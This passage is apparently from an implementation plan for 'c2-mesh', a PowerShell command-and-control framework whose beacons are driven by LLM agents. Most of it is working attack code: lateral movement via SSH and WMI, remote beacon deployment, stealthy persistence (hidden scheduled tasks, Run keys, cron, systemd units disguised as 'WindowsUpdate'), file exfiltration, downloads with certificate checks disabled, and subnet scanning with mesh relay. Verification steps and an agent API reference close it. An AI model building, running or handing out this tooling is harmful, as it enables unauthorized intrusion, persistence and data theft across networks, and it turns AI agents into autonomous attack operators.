                        $proc = [System.Diagnostics.Process]::Start($psi)
                        $stdout = $proc.StandardOutput.ReadToEnd()
                        $stderr = $proc.StandardError.ReadToEnd()
                        $proc.WaitForExit(30000)
                        $output = $stdout
                        if ($stderr) { $output += "`nSTDERR: $stderr" }
                        "SSH result from ${target}:`n$output"
                    }
                    'wmi' {
                        $params = @{
                            ComputerName = $target
                            Class        = 'Win32_Process'
                            Name         = 'Create'
                            ArgumentList = @($cmd)
                            ErrorAction  = 'Stop'
                        }
                        if ($cred) { $params.Credential = $cred }
                        $result = Invoke-WmiMethod @params
                        "WMI process created on ${target}: ReturnValue=$($result.ReturnValue), PID=$($result.ProcessId)"
                    }
                }
            }
            catch {
                "Lateral move failed ($method to $target): $_"
            }
        }
}
```

### 6.3 `BeaconTools/Invoke-DeployBeacon.ps1`

```powershell
function Invoke-DeployBeacon {
    <#
    .SYNOPSIS
    Create the deploy_beacon tool (beacon-side). Returns PshAgentTool.
    Deploys a new beacon to a target host from the current beacon.
    .PARAMETER ControllerUrl
    Controller URL to pass to the new beacon
    .PARAMETER Key
    Shared encryption key to pass to the new beacon
    .PARAMETER ModulePayload
    Base64-encoded c2-mesh module for transfer to target
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter()]
        [string]$ModulePayload
    )

    $ctrlUrl = $ControllerUrl
    $sharedKey = $Key
    $payload = $ModulePayload

    return New-Tool -Name 'deploy_beacon' `
        -Description 'Deploy a new C2 beacon to a remote host from this beacon. Uses PowerShell remoting.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                target    = @{ type = 'string'; description = 'Target hostname or IP to deploy beacon to' }
                username  = @{ type = 'string'; description = 'Username for authentication (optional)' }
                password  = @{ type = 'string'; description = 'Password for authentication (optional)' }
                beacon_id = @{ type = 'string'; description = 'Custom beacon ID for the new beacon (auto-generated if omitted)' }
            }
            required   = @('target')
        } `
        -Execute {
            param($a)
            $target = $a.target
            $bid = if ($a.beacon_id) { $a.beacon_id } else { 'beacon-' + [guid]::NewGuid().ToString('N').Substring(0, 6) }

            $cred = $null
            if ($a.username -and $a.password) {
                $secPass = ConvertTo-SecureString $a.password -AsPlainText -Force
                $cred = [PSCredential]::new($a.username, $secPass)
            }

            # Build remote launch script
            $remoteScript = @"
`$ErrorActionPreference = 'Stop'
# Decode and import module payload
if ('$payload') {
    `$bytes = [Convert]::FromBase64String('$payload')
    `$tempDir = Join-Path `$env:TEMP 'c2-mesh-$bid'
    New-Item -ItemType Directory -Path `$tempDir -Force | Out-Null
    `$zipPath = Join-Path `$tempDir 'c2-mesh.zip'
    [System.IO.File]::WriteAllBytes(`$zipPath, `$bytes)
    Expand-Archive -Path `$zipPath -DestinationPath `$tempDir -Force
    Import-Module (Join-Path `$tempDir 'PshAgent' 'PshAgent.psd1') -Force
    Import-Module (Join-Path `$tempDir 'c2-mesh' 'c2-mesh.psd1') -Force
}
# Start beacon in background
Start-Job -ScriptBlock {
    Start-C2Beacon -ControllerUrl '$ctrlUrl' -Key '$sharedKey' -BeaconId '$bid'
}
"@

            try {
                $params = @{
                    ComputerName = $target
                    ScriptBlock  = [scriptblock]::Create($remoteScript)
                    ErrorAction  = 'Stop'
                }
                if ($cred) { $params.Credential = $cred }
                Invoke-Command @params
                "Beacon '$bid' deployed to $target successfully."
            }
            catch {
                "Deploy beacon failed to $target: $_"
            }
        }.GetNewClosure()
}
```

### 6.4 `BeaconTools/Invoke-Persist.ps1`

```powershell
function Invoke-Persist {
    <#
    .SYNOPSIS
    Create the persist tool. Returns PshAgentTool.
    Establish persistence via various mechanisms.
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param()

    return New-Tool -Name 'persist' `
        -Description 'Establish persistence on the current host using scheduled tasks, registry run keys, startup folder, or cron jobs.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                method  = @{
                    type        = 'string'
                    description = 'Persistence method: scheduled_task, registry, startup_folder, cron, systemd'
                    enum        = @('scheduled_task', 'registry', 'startup_folder', 'cron', 'systemd')
                }
                payload = @{ type = 'string'; description = 'Command or script to persist' }
                name    = @{ type = 'string'; description = 'Name for the persistence entry (e.g., task name, registry value name)' }
            }
            required   = @('method', 'payload')
        } `
        -Execute {
            param($a)
            $method  = $a.method
            $payload = $a.payload
            $name    = if ($a.name) { $a.name } else { 'WindowsUpdate' + (Get-Random -Maximum 9999) }

            try {
                switch ($method) {
                    'scheduled_task' {
                        $action = New-ScheduledTaskAction -Execute 'powershell.exe' `
                            -Argument "-WindowStyle Hidden -NoProfile -Command `"$payload`""
                        $trigger = New-ScheduledTaskTrigger -AtLogOn
                        Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger `
                            -Description 'System Maintenance' -RunLevel Highest -ErrorAction Stop
                        "Scheduled task '$name' created (runs at logon)."
                    }
                    'registry' {
                        $regPath = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
                        $value = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"$payload`""
                        Set-ItemProperty -Path $regPath -Name $name -Value $value -ErrorAction Stop
                        "Registry run key '$name' set at $regPath."
                    }
                    'startup_folder' {
                        $startupPath = [System.Environment]::GetFolderPath('Startup')
                        $scriptPath = Join-Path $startupPath "$name.ps1"
                        Set-Content -Path $scriptPath -Value $payload -ErrorAction Stop
                        "Startup script created: $scriptPath"
                    }
                    'cron' {
                        # Linux/macOS cron
                        $currentCron = & crontab -l 2>&1
                        if ($LASTEXITCODE -ne 0) { $currentCron = '' }
                        $newCron = "$currentCron`n@reboot $payload"
                        $newCron | & crontab - 2>&1
                        "Cron job added: @reboot $payload"
                    }
                    'systemd' {
                        # Linux systemd user service
                        $unitDir = Join-Path $HOME '.config' 'systemd' 'user'
                        New-Item -ItemType Directory -Path $unitDir -Force | Out-Null
                        $unitContent = @"
[Unit]
Description=$name

[Service]
ExecStart=/usr/bin/pwsh -NoProfile -Command "$payload"
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"@
                        $unitPath = Join-Path $unitDir "$name.service"
                        Set-Content -Path $unitPath -Value $unitContent
                        & systemctl --user daemon-reload 2>&1
                        & systemctl --user enable $name 2>&1
                        & systemctl --user start $name 2>&1
                        "Systemd user service '$name' created and started."
                    }
                }
            }
            catch {
                "Persistence failed ($method): $_"
            }
        }
}
```

### 6.5 `BeaconTools/Invoke-FileOps.ps1`

```powershell
function Invoke-FileOps {
    <#
    .SYNOPSIS
    Create the file_ops tool. Returns PshAgentTool.
    File operations: read, write, download, upload, search.
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param()

    return New-Tool -Name 'file_ops' `
        -Description 'File operations on the current host: read, write, list, search, download (HTTP), and exfiltrate (base64 encode for transport).' `
        -Parameters @{
            type       = 'object'
            properties = @{
                operation = @{
                    type        = 'string'
                    description = 'Operation: read, write, list, search, download, exfil'
                    enum        = @('read', 'write', 'list', 'search', 'download', 'exfil')
                }
                path      = @{ type = 'string'; description = 'File or directory path' }
                content   = @{ type = 'string'; description = 'Content for write operation' }
                pattern   = @{ type = 'string'; description = 'Search pattern (glob for list, regex for search)' }
                url       = @{ type = 'string'; description = 'URL for download operation' }
            }
            required   = @('operation')
        } `
        -Execute {
            param($a)
            $op = $a.operation

            try {
                switch ($op) {
                    'read' {
                        if (-not $a.path) { throw "path required for read" }
                        $content = Get-Content $a.path -Raw -ErrorAction Stop
                        if ($content.Length -gt 10000) {
                            $content = $content.Substring(0, 10000) + "`n...(truncated at 10KB)"
                        }
                        $content
                    }
                    'write' {
                        if (-not $a.path -or -not $a.content) { throw "path and content required for write" }
                        Set-Content -Path $a.path -Value $a.content -ErrorAction Stop
                        "Written $($a.content.Length) bytes to $($a.path)"
                    }
                    'list' {
                        $targetPath = if ($a.path) { $a.path } else { '.' }
                        $pattern = if ($a.pattern) { $a.pattern } else { '*' }
                        $items = Get-ChildItem -Path $targetPath -Filter $pattern -ErrorAction Stop |
                            Select-Object -First 100 Name, Length, LastWriteTime, @{N='Type';E={if($_.PSIsContainer){'Dir'}else{'File'}}}
                        $items | ForEach-Object {
                            "$($_.Type) $($_.Name) $($_.Length) $($_.LastWriteTime)"
                        } | Out-String
                    }
                    'search' {
                        if (-not $a.pattern) { throw "pattern required for search" }
                        $targetPath = if ($a.path) { $a.path } else { '.' }
                        $results = Get-ChildItem -Path $targetPath -Recurse -File -ErrorAction SilentlyContinue |
                            Where-Object { $_.Length -lt 1MB } |
                            Select-String -Pattern $a.pattern -ErrorAction SilentlyContinue |
                            Select-Object -First 50 Path, LineNumber, Line
                        $results | ForEach-Object {
                            "$($_.Path):$($_.LineNumber): $($_.Line.Trim())"
                        } | Out-String
                    }
                    'download' {
                        if (-not $a.url) { throw "url required for download" }
                        $destPath = if ($a.path) { $a.path } else {
                            $fname = [System.IO.Path]::GetFileName([uri]::new($a.url).AbsolutePath)
                            if (-not $fname) { $fname = 'download.bin' }
                            Join-Path $env:TEMP $fname
                        }
                        $handler = [System.Net.Http.HttpClientHandler]::new()
                        $handler.ServerCertificateCustomValidationCallback = { $true }
                        $client = [System.Net.Http.HttpClient]::new($handler)
                        try {
                            $bytes = $client.GetByteArrayAsync($a.url).GetAwaiter().GetResult()
                            [System.IO.File]::WriteAllBytes($destPath, $bytes)
                            "Downloaded $($bytes.Length) bytes to $destPath"
                        }
                        finally {
                            $client.Dispose()
                            $handler.Dispose()
                        }
                    }
                    'exfil' {
                        if (-not $a.path) { throw "path required for exfil" }
                        $bytes = [System.IO.File]::ReadAllBytes($a.path)
                        if ($bytes.Length -gt 1MB) { throw "File too large for base64 transport (>1MB)" }
                        $b64 = [Convert]::ToBase64String($bytes)
                        "BASE64:$($a.path):$b64"
                    }
                }
            }
            catch {
                "file_ops error ($op): $_"
            }
        }
}
```

---

## 7. Phase 5: Mesh

### 7.1 `Mesh/New-MeshRelayTool.ps1`

Beacon-to-beacon relay: forward tasks to peer beacons that the controller can't reach directly.

```powershell
function New-MeshRelayTool {
    <#
    .SYNOPSIS
    Create the mesh_relay tool. Returns PshAgentTool.
    Relay a task to a peer beacon via direct HTTP.
    .PARAMETER Key
    Shared encryption key
    .PARAMETER MeshPort
    Port for mesh relay (default from C2Config)
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param(
        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter()]
        [int]$MeshPort = $script:C2Config.MeshPort
    )

    $sharedKey = $Key
    $port = $MeshPort

    return New-Tool -Name 'mesh_relay' `
        -Description 'Relay a task to a peer beacon. Use when the controller cannot reach a target directly but this beacon can.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                peer_ip   = @{ type = 'string'; description = 'IP address of the peer beacon' }
                peer_port = @{ type = 'integer'; description = "Peer mesh port (default: $port)" }
                task      = @{ type = 'string'; description = 'Task to relay to the peer' }
                ttl       = @{ type = 'integer'; description = 'Remaining hops (default: 3). Decremented on each relay.' }
            }
            required   = @('peer_ip', 'task')
        } `
        -Execute {
            param($a)
            $peerIp   = $a.peer_ip
            $peerPort = if ($a.peer_port) { $a.peer_port } else { $port }
            $task     = $a.task
            $ttl      = if ($a.ttl) { $a.ttl } else { $script:C2Config.RelayTTL }

            if ($ttl -le 0) {
                return "Relay dropped: TTL expired."
            }

            $relayData = @{
                task = $task
                ttl  = $ttl - 1
                from = [System.Net.Dns]::GetHostName()
            } | ConvertTo-Json -Compress

            $encrypted = Invoke-C2Encrypt -Plaintext $relayData -Key $sharedKey

            $handler = [System.Net.Http.HttpClientHandler]::new()
            $handler.ServerCertificateCustomValidationCallback = { $true }
            $client = [System.Net.Http.HttpClient]::new($handler)
            $client.Timeout = [timespan]::FromSeconds(30)

            try {
                $content = [System.Net.Http.StringContent]::new(
                    $encrypted, [System.Text.Encoding]::UTF8, 'application/octet-stream')
                $url = "https://${peerIp}:${peerPort}/relay"
                $resp = $client.PostAsync($url, $content).GetAwaiter().GetResult()
                $respBody = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()

                $decrypted = Invoke-C2Decrypt -CipherText $respBody -Key $sharedKey
                $result = $decrypted | ConvertFrom-Json -AsHashtable
                "Relay to ${peerIp}: $($result | ConvertTo-Json -Compress)"
            }
            catch {
                "Relay to ${peerIp}:${peerPort} failed: $_"
            }
            finally {
                $client.Dispose()
                $handler.Dispose()
            }
        }.GetNewClosure()
}
```

### 7.2 `Mesh/Invoke-MeshDiscovery.ps1`

Discover peer beacons on the local network.

```powershell
function Invoke-MeshDiscovery {
    <#
    .SYNOPSIS
    Create the mesh_discover tool. Returns PshAgentTool.
    Scans the local subnet for peer beacons by probing the mesh port.
    .PARAMETER MeshPort
    Port to probe (default from C2Config)
    .PARAMETER Key
    Shared key for handshake verification
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param(
        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter()]
        [int]$MeshPort = $script:C2Config.MeshPort
    )

    $sharedKey = $Key
    $port = $MeshPort

    return New-Tool -Name 'mesh_discover' `
        -Description 'Discover peer beacons on the local network by probing the mesh port. Returns list of responding peers.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                subnet  = @{
                    type        = 'string'
                    description = 'CIDR to scan (e.g., 10.0.1.0/24). If omitted, scans local subnet.'
                }
                timeout = @{ type = 'integer'; description = 'Probe timeout in ms (default: 2000)' }
            }
            required   = @()
        } `
        -Execute {
            param($a)
            $timeout = if ($a.timeout) { $a.timeout } else { 2000 }

            # Determine subnet if not provided
            $subnet = $a.subnet
            if (-not $subnet) {
                try {
                    $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
                        $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' -and $_.IPAddress -ne '127.0.0.1'
                    } | Select-Object -First 1)
                    $subnet = "$($localIp.IPAddress)/$($localIp.PrefixLength)"
                }
                catch {
                    return "Could not determine local subnet: $_"
                }
            }

            # Parse CIDR
            $parts = $subnet -split '/'
            $ip = [System.Net.IPAddress]::Parse($parts[0])
            $prefix = [int]$parts[1]
            $ipBytes = $ip.GetAddressBytes()
            [Array]::Reverse($ipBytes)
            $ipInt = [BitConverter]::ToUInt32($ipBytes, 0)
            $mask = [uint32]([math]::Pow(2, 32) - [math]::Pow(2, 32 - $prefix))
            $network = $ipInt -band $mask
            $broadcast = $network -bor (-bnot $mask -band 0xFFFFFFFF)

            $peers = [System.Collections.Generic.List[string]]::new()
            $myIp = $ip.ToString()

            # Probe each host in parallel using runspace pool
            $pool = [runspacefactory]::CreateRunspacePool(1, 20)
            $pool.Open()
            $jobs = @()

            for ($i = $network + 1; $i -lt $broadcast; $i++) {
                $bytes = [BitConverter]::GetBytes([uint32]$i)
                [Array]::Reverse($bytes)
                $targetIp = ([System.Net.IPAddress]::new($bytes)).ToString()

                if ($targetIp -eq $myIp) { continue }

                $ps = [powershell]::Create()
                $ps.RunspacePool = $pool
                $null = $ps.AddScript({
                    param($ip, $port, $timeout)
                    try {
                        $tcp = [System.Net.Sockets.TcpClient]::new()
                        $task = $tcp.ConnectAsync($ip, $port)
                        if ($task.Wait($timeout) -and $tcp.Connected) {
                            $tcp.Close()
                            return $ip
                        }
                        $tcp.Close()
                    }
                    catch { }
                    return $null
                }).AddArgument($targetIp).AddArgument($port).AddArgument($timeout)

                $jobs += @{ PS = $ps; Handle = $ps.BeginInvoke() }
            }

            # Collect results
            foreach ($job in $jobs) {
                $result = $job.PS.EndInvoke($job.Handle)
                if ($result -and $result[0]) {
                    $peers.Add($result[0])
                }
                $job.PS.Dispose()
            }
            $pool.Close()
            $pool.Dispose()

            if ($peers.Count -eq 0) {
                "No peer beacons found on $subnet (port $port)."
            }
            else {
                "Found $($peers.Count) potential peer(s) on port ${port}:`n" + ($peers -join "`n")
            }
        }.GetNewClosure()
}
```

### 7.3 `Mesh/Invoke-SwarmTask.ps1`

Distribute a task across multiple beacons (from the operator side).

```powershell
function Invoke-SwarmTask {
    <#
    .SYNOPSIS
    Create the swarm_task operator tool. Returns PshAgentTool.
    Sends the same task to multiple beacons simultaneously.
    .PARAMETER TaskQueues
    ConcurrentDictionary of per-beacon task queues
    .PARAMETER Registry
    Beacon registry
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param(
        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]$Registry
    )

    $tq = $TaskQueues
    $reg = $Registry

    return New-Tool -Name 'swarm_task' `
        -Description 'Send a task to multiple beacons at once. Targets all alive beacons or a specified list.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                task       = @{ type = 'string'; description = 'Task to execute on all targeted beacons' }
                beacon_ids = @{
                    type        = 'array'
                    description = 'Specific beacon IDs to target. If omitted, targets all alive beacons.'
                    items       = @{ type = 'string' }
                }
            }
            required   = @('task')
        } `
        -Execute {
            param($a)
            $task = $a.task

            # Determine target beacons
            $targets = if ($a.beacon_ids -and $a.beacon_ids.Count -gt 0) {
                $a.beacon_ids
            }
            else {
                @($reg.GetEnumerator() | Where-Object { $_.Value.alive } | ForEach-Object { $_.Key })
            }

            if ($targets.Count -eq 0) {
                return "No alive beacons to target."
            }

            $results = @()
            foreach ($bid in $targets) {
                $taskObj = Send-BeaconTask -BeaconId $bid -Task $task -TaskQueues $tq
                $results += "  $bid: task $($taskObj.taskId) queued"
            }

            "Swarm task sent to $($targets.Count) beacon(s):`n$($results -join "`n")"
        }.GetNewClosure()
}
```

---

## 8. Verification Steps

### Phase 1: Foundation

```powershell
# Test crypto round-trip
Import-Module ./c2-mesh/c2-mesh.psd1 -Force
$key = New-C2Key
$encrypted = Invoke-C2Encrypt -Plaintext 'hello world' -Key $key
$decrypted = Invoke-C2Decrypt -CipherText $encrypted -Key $key
# Assert: $decrypted -eq 'hello world'

# Test with JSON payload
$payload = @{ beaconId = 'test'; data = 'some data' } | ConvertTo-Json
$enc = Invoke-C2Encrypt -Plaintext $payload -Key $key
$dec = Invoke-C2Decrypt -CipherText $enc -Key $key
# Assert: ($dec | ConvertFrom-Json).beaconId -eq 'test'
```

### Phase 2: Controller

```powershell
# Start controller in a separate pwsh session
Import-Module ./PshAgent/PshAgent.psd1 -Force
Import-Module ./c2-mesh/c2-mesh.psd1 -Force

$key = New-C2Key
$stores = Get-BeaconRegistry

# Start listener
$listener = Start-C2Listener -Port 8443 -Key $key `
    -Registry $stores.Registry `
    -TaskQueues $stores.TaskQueues `
    -ResultStore $stores.ResultStore

# Simulate beacon registration
$regPayload = @{ beaconId = 'test-1'; hostname = 'TESTPC'; username = 'admin'; os = 'Windows'; ip = '10.0.1.5'; pid = 1234 }
$encrypted = Invoke-C2Encrypt -Plaintext ($regPayload | ConvertTo-Json -Compress) -Key $key
# POST to https://localhost:8443/register (use Invoke-WebRequest or HttpClient)

# Verify registration
$stores.Registry['test-1']  # Should show the beacon entry

# Queue a task
Send-BeaconTask -BeaconId 'test-1' -Task 'Run host_recon' -TaskQueues $stores.TaskQueues

# Simulate check-in
$checkinPayload = @{ beaconId = 'test-1'; results = @() }
# POST to /checkin — response should contain the queued task

# Clean up
Stop-C2Listener -ListenerState $listener
```

### Phase 3: Beacon Core

```powershell
# Terminal 1: Start controller
./c2-mesh/Launchers/start-controller.ps1
# Note the generated key

# Terminal 2: Start beacon
./c2-mesh/Launchers/start-beacon.ps1 -ControllerUrl 'https://localhost:8443' -Key '<key>'

# In Terminal 1 (operator CLI):
# > list beacons
# > task beacon-xxx to run host_recon
# > get results from beacon-xxx

# Verify:
# - Beacon registers and appears in list_beacons
# - Tasks are delivered on check-in
# - Results flow back to controller
# - Kill signal terminates the beacon
```

### Phase 4: Beacon Tools

```powershell
# After Phase 3 is working, add remaining tools:
Import-Module ./c2-mesh/c2-mesh.psd1 -Force

# Create all tools individually and test
$credTool = Invoke-CredHarvest
$latTool  = Invoke-LateralMove
$depTool  = Invoke-DeployBeacon -ControllerUrl 'https://localhost:8443' -Key $key
$perTool  = Invoke-Persist
$fileTool = Invoke-FileOps

# Test file_ops locally
$fileTool.Invoke(@{ operation = 'list'; path = '.' })
$fileTool.Invoke(@{ operation = 'read'; path = './c2-mesh/c2-mesh.psd1' })

# Test host_recon
$hostRecon = (New-BeaconTools)[0]
$hostRecon.Invoke(@{ sections = @('system', 'network') })

# Integrate into beacon by passing as ExtraTools:
Start-C2Beacon -ControllerUrl 'https://localhost:8443' -Key $key `
    -ExtraTools @($credTool, $latTool, $depTool, $perTool, $fileTool)
```

### Phase 5: Mesh

```powershell
# Start controller on host A
./c2-mesh/Launchers/start-controller.ps1

# Start beacon on host A (can reach B but controller can't)
# Start beacon on host B

# From operator:
# > task beacon-A to discover mesh peers
# > task beacon-A to relay port_scan task to peer at 10.0.1.10
# > swarm all beacons to run host_recon

# Verify:
# - mesh_discover finds peer beacons
# - mesh_relay successfully forwards tasks
# - swarm_task reaches all beacons
```

---

## 9. PshAgent API Reference

Quick reference of the PshAgent APIs used throughout this implementation.

### `New-Tool` — `PshAgent/Public/New-Tool.ps1`

```powershell
New-Tool -Name <string> -Description <string> -Parameters <hashtable> -Execute <scriptblock>
# Returns: [PshAgentTool]
# Parameters hashtable = JSON Schema: @{ type='object'; properties=@{...}; required=@(...) }
# Execute receives: param($a) where $a is a hashtable of arguments
```

### `New-Hook` — `PshAgent/Public/New-Hook.ps1`

```powershell
New-Hook -Name <string> -EventType <AgentEventType> -Fn <scriptblock>
# Returns: [PshAgentHook]
# Fn receives: param($event) where $event is an AgentEvent subclass
# Return $null to continue, or a [Reaction] to control flow
```

### `New-Agent` — `PshAgent/Public/New-Agent.ps1`

```powershell
New-Agent -Generator <PshGenerator> [-Name <string>] [-SystemPrompt <string>]
          [-Toolkit <PshAgentToolkit>] [-Tools <PshAgentTool[]>]
          [-StopCondition <StopCondition>] [-MaxSteps <int>]
          [-Hooks <PshAgentHook[]>] [-GenerateOptions <hashtable>]
# Returns: [PshAgent]
```

### `Invoke-Agent` — `PshAgent/Public/Invoke-Agent.ps1`

```powershell
Invoke-Agent -Agent <PshAgent> -Prompt <string> [-Trajectory <Trajectory>]
# Returns: @{ Status=[AgentStatus]; Output=[string]; Steps=[int]; Usage=[Usage]; Trajectory=[Trajectory]; Error=[string] }
```

### `Start-PshAgent` — `PshAgent/Public/Start-PshAgent.ps1`

```powershell
Start-PshAgent [-ConnectionString <string>] [-SystemPrompt <string>]
               [-Tools <PshAgentTool[]>] [-Hooks <PshAgentHook[]>]
               [-StopCondition <StopCondition>] [-MaxSteps <int>] [-Compact]
# Interactive REPL — blocks until /quit
```

### `New-SubAgentTool` — `PshAgent/Public/New-SubAgentTool.ps1`

```powershell
New-SubAgentTool -Name <string> -Description <string> -ConnectionString <string>
                 -SystemPrompt <string> [-Tools <PshAgentTool[]>]
                 [-BuiltinTools <string[]>] [-ToolModules <string[]>]
                 [-MaxSteps <int>] [-OutOfProcess]
# Returns: [PshAgentTool] that delegates to a child agent
```

### `PshGenerator` — `PshAgent/Classes/Generator.ps1`

```powershell
$gen = [PshGenerator]::new('anthropic/claude-sonnet-4-20250514')
$gen = [PshGenerator]::new('openai/gpt-4o', @{ temperature = 0.7 })
$result = $gen.Generate([Message[]]$messages, [hashtable]$options)
# $result = @{ Message=[Message]; Usage=[Usage]; StopReason=[string] }
```

### `Reaction` — `PshAgent/Classes/Reaction.ps1`

```powershell
[Reaction]::Continue()                        # Priority 2 — no action
[Reaction]::Retry()                           # Priority 3 — retry generation
[Reaction]::RetryWithFeedback('message')      # Priority 3 — retry with user message
[Reaction]::Fail('reason')                    # Priority 4 — fail agent
[Reaction]::Finish()                          # Priority 5 — finish agent (highest)
```

### `AgentEventType` enum — `PshAgent/Classes/Types.ps1`

```
AgentStart, AgentEnd, AgentStalled, AgentError
GenerationStart, GenerationEnd, GenerationStep, GenerationError
ToolStart, ToolEnd, ToolStep, ToolError
ReactStep
```

### `StopCondition` — `PshAgent/Classes/StopCondition.ps1`

```powershell
$cond = [StopCondition]::new('name', { param($steps) $steps.Count -ge 10 })
$cond = New-StepCountCondition -MaxSteps 10
$combined = $cond1.And($cond2)   # both must be true
$combined = $cond1.Or($cond2)    # either true
$inverted = $cond.Not()
```
